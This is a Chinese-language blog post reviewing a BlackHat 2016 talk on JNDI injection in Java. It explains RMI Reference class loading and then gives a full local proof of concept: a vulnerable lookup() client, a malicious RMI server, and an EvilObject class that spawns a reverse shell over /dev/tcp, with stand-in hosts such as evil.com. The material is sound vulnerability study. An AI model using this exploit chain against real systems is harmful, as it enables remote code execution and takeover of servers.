---
layout: post
title: BlackHat 2016 回顾之 JNDI 注入简单解析
tags: [web, java, security]
---

（两个多月没产出了，感觉最近身体被掏空~）

BlackHat 2016 (USA) 刚结束不久，作为 Web🐶 的我立马去过了一遍与 Web 相关的议题。Web 相关的议题也不算太多，比较精华的就是 [@pentester](https://twitter.com/pwntester) 大牛的议题 - ["A Journey From JNDI LDAP Manipulation To RCE"](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)，其介绍了 Java 中利用 JNDI 进行 RCE 的具体思路和案例，早在今年 1 月时就已经爆出过 Spring 框架的一个 RCE，该漏洞原理最根本就是利用了 JNDI 的注入，反序列化只起到一个触发 JNDI 注入的作用。

本文在学习议题 PPT 的基础上，结合自己的一些理解，按理论基础了解到具体利用实现的一个过程进行回顾。（也是一名不会 Java 的 Web🐶 尝试理解漏洞原理和 EXP 构造的一个记录过程，**文章内容如有不当还望指出**）

### 0x00 - JNDI 是什么？

JNDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。如下图：

![](/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png)

在 Java 中为了能够更方便的管理、访问和调用远程的资源对象，常常会使用 LDAP 和 RMI 等服务来将资源对象或方法绑定在固定的远程服务端，供应用程序来进行访问和调用。为了更好的理解整个 JNDI 注入产生的原因，下面用实际代码来说明一下常规 RMI 访问和使用 JNDI 访问 RMI 的区别。（更多 JNDI 的概念可参考 [http://baike.baidu.com/view/209575.htm](http://baike.baidu.com/view/209575.htm)）

#### 1. JNDI 获取并调用远程方法

首先一个对象方法要想被远程应用所调用需要其 extends 于 `java.rmi.Remote` 接口，并需要抛出 `RemoteException` 异常，而远程对象必须实现 `java.rmi.server.UniCastRemoteObject` 类。首先创建一个 `IHello` 的接口（`IHello.java`）：

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IHello extends Remote {
    public String sayHello(String name) throws RemoteException;
}
```

再创建 `IHelloImpl` 类实现 `java.rmi.server.UniCastRemoteObject` 类并包含 `IHello` 接口（`IHelloImpl.java`）：

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class IHelloImpl extends UnicastRemoteObject implements IHello {
    protected IHelloImpl() throws RemoteException {
        super();
    }
    public String sayHello(String name) throws RemoteException {
        return "Hello " + name + " ^_^ ";
    }
}
```

最后用 RMI 绑定实例对象方法，并使用 JNDI 去获取并调用对象方法（`CallService.java`）：

```java
import java.util.Properties;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import javax.naming.Context;
import javax.naming.InitialContext;

public class CallService {
    public static void main(String args[]) throws Exception {
        // 配置 JNDI 默认设置
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL,
                "rmi://localhost:1099");
        Context ctx = new InitialContext(env);

        // 本地开启 1099 端口作为 RMI 服务，并以标识 "hello" 绑定方法对象
        Registry registry = LocateRegistry.createRegistry(1099);
        IHello hello = new IHelloImpl();
        registry.bind("hello", hello);

        // JNDI 获取 RMI 上的方法对象并进行调用
        IHello rHello = (IHello) ctx.lookup("hello");
        System.out.println(rHello.sayHello("RickGray"));
    }
}
```

将上面 3 个文件放在同一目录，并使用 `javac *.java` 进行编译，然后运行 `java CallService` 即可得到运行结果。

![](/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/2.png)

使用更为直观的图示来描述整个流程：

![](/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/3.png)

这里应用使用 JNDI 获取远程 `sayHello()` 函数并传入 `"RickGray"` 参数进行调用时，真正执行该函数是在远程服务端，执行完成后会将结果序列化返回给应用端，这一点是需要弄清楚的。

#### 2. RMI 中动态加载字节代码

如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。

Reference 中几个比较关键的属性：

1. className - 远程加载时所使用的类名
2. classFactory - 加载的 class 中需要实例化类的名称
3. classFactoryLocation - 提供 classes 数据的地址可以是 file/ftp/http 等协议

例如这里定义一个 Reference 实例，并使用继承了 `UnicastRemoteObject` 类的 `ReferenceWrapper` 包裹一下实例对象，使其能够通过 RMI 进行远程访问：

```java
Reference refObj = new Reference("refClassName", "insClassName", "http://example.com:12345/");
ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
registry.bind("refObj", refObjWrapper);
```

当有客户端通过 `lookup("refObj")` 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 `CLASSPATH` 去寻找被标识为 `refClassName` 的类，如果本地未找到，则会去请求 `http://example.com:12345/refClassName.class` 动态加载 classes 并调用 `insClassName` 的构造函数。

借用官方的流程图：

![](/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/4.png)

这里说明了在获取 RMI 远程对象时，可以动态地加载外部代码进行对象类型实例化，而 JNDI 同样具有访问 RMI 运城对象的能力，只要其查找参数即 `lookup()` 函数的参数值可控，那么就有可能促使程序去加载和自信部署在攻击者服务器上的恶意代码。

### 0x02 JNDI 协议动态转换

前面简单的用代码和图例说明了 JNDI 的应用方式和 RMI 中的动态字节代码加载，在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等）：

```java
Properties env = new Properties();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,
        "rmi://localhost:1099");
Context ctx = new InitialContext(env);
```

而在调用 `lookup()` 或者 `search()` 时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：

```java
ctx.lookup("ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com");
```

在议题所提供的 Write-Up 里有提供详细远离的代码来说明为什么可以使用绝对路径 URI 去动态地转换上下文环境：

```java
public Object lookup(String name) throws NamingException {
    return getURLOrDefaultInitCtx(name).lookup(name);
}
```

`getURLOrDefaultInitCtx()` 函数的具体代码实现为：

```java
protected Context getURLOrDefaultInitCtx(Name paramName) throws NamingException {
    if (NamingManager.hasInitialContextFactoryBuilder()) {
        return getDefaultInitCtx(); 
    }
    if (paramName.size() > 0) {
        String str1 = paramName.get(0);
        String str2 = getURLScheme(str1);  // 尝试解析 URI 中的协议
        if (str2 != null) {
            // 如果存在 Schema 协议，则尝试获取其对应的上下文环境
            Context localContext = NamingManager.getURLContext(str2, this.myProps);
            if (localContext != null) { 
                return localContext;
            }
        }  
    }
    return getDefaultInitCtx();
}
```

但第一次调用 `lookup()` 函数的时候，会对上下文环境进行一个初始化，这时候代码会对 `paramName` 参数值进行一个 URL 解析，如果 `paramName` 包含一个特定的 Schema 协议，代码则会使用相应的工厂去初始化上下文环境，这时候不管之前配置的工厂环境是什么，这里都会被动态地对其进行替换。

### 0x03 利用 JNDI 注入加载远程代码并执行

结合前面说到的两个点：

* JNDI 调用中 `lookup()` 参数可控
* 使用带协议的 URI 可以进行动态环境转换
* `Reference` 类动态代码获取进行实例化

即当 Java 应用代码中出现 `lookup(<attacker-controlled>)` 这种情况时，会形成 RCE，整个利用过程为：

![](/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/5.png)

1. 攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 `rmi://evil.com:1099/refObj`；
2. 原先配置好的上下文环境 `rmi://localhost:1099` 会因为动态环境转换而被指向 `rmi://evil.com:1099/`；
3. 应用去 `rmi://evil.com:1099` 请求绑定对象 `refObj`，攻击者事先准备好的 RMI 服务会返回与名称 `refObj` 想绑定的 ReferenceWrapper 对象（`Reference("EvilObject", "EvilObject", "http://evil-cb.com/")`）；
4. 应用获取到 `ReferenceWrapper` 对象开始从本地 `CLASSPATH` 中搜索 `EvilObject` 类，如果不存在则会从 `http://evil-cb.com/` 上去尝试获取 `EvilObject.class`，即动态的去获取 `http://evil-cb.com/EvilObject.class`；
5. 攻击者事先准备好的服务返回编译好的包含恶意代码的 `EvilObject.class`；
6. 应用开始调用 `EvilObject` 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；

整个攻击的实现过程如上面所述，**关键的利用点在于攻击者可控的允、许动态环境转换的接口函数**，这里举了 `RMI` 结合 `Reference Object` 进行 RCE 的例子，更多的攻击向量参考原议题内容即可（因为我也理解得不是特别透彻，怕写错误导了大家）

下面给出完整的演示代码示例，首先是存在 JNDI 注入的程序（`RMIService.java`）：

```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIClient {
    public static void main(String[] args) throws Exception {
        if(args.length < 1) {
            System.out.println("Usage: java JNDIClient <uri>");
            System.exit(-1);
        }
        String uri = args[0];
        Context ctx = new InitialContext();
        System.out.println("Using lookup() to fetch object with " + uri);
        ctx.lookup(uri);
    }
}
```

接着是要通过 JNDI 注入远程加载的类实例，一会儿可以用 `python -m SimpleHTTPServer` 启一个临时的 HTTP 服务来提供编译好的 `EvilObject.class`（`EvilObject.java`）：

```java
import java.lang.Runtime;
import java.lang.Process;

public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/sh", "-c", "/bin/sh -i > /dev/tcp/127.0.0.1/1337 2>&1 0>&1"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
```

`EvilObject` 类的构造函数中包含了执行系统命令反弹 Shell 的代码，一会儿当 JNDI 注入成功触发时会被执行。

这里还需要一个 RMI 服务绑定一个相关的引用类（`RMIService.java`）：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;

public class RMIService {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'");
        registry.bind("refObj", refObjWrapper);
    }
}
```

前面也说到了对象实例要能成功绑定在 RMI 服务上，必须直接或间接的实现 `Remote` 接口，这里 `ReferenceWrapper` 就继承于 `UnicastRemoteObject` 类并实现了 `Remote` 接口。

这里将 `RMIService.java` 和 `JNDIClient.java` 放在同一目录下，将 `EvilObject.java` 放在另一个目录下（为防止漏洞复现过程中应用端实例化 EvilObject 对象时从 CLASSPATH 当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令：

![](/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/6.png)

成功执行后会在事先监听的端口上获取到反弹的 Shell。这里的代码只是为了方便还原漏洞场景，其他比较细节的东西这里就不讨论了。看不懂的可以多理解下前面那幅漏洞利用过程图例，这样结合代码能够更快速的掌握漏洞原理和关键点。

### 0x04 简单总结

由于 Java 知识能力有限，原议题中所涉及到的一些细节可能剖析得不太准确。文中只是简单地把 JNDI 注入的形成原理和如何利用 JNDI 注入进行 RCE 进行了一个说明，具体的攻击方式也只是谈到了用 RMI Reference 进行远程代码执行，原议题内容中还介绍了一些其它的攻击向量能够达到远程代码执行的效果，例如反序列化触发 JNDI 注入、使用 Remote Locations 进行代码执行和一些安全机制的绕过等等。

像今年 1 月份有关 Spring 框架反序列化导致远程代码执行的这个漏洞最根本原理就是利用了 JNDI 注入，有关详情可以参考 [@随风](https://www.iswin.org/) 师傅的文章 - [《Spring framework deserialization RCE漏洞分析以及利用》](https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/)，更多关于该议题的内容还是翻阅下原 Paper 比较好。

（世上漏洞如海，我愿略知一二）

### 参考

* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
* [http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection](http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection)
* [https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html](https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html)
* [https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用](https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用)
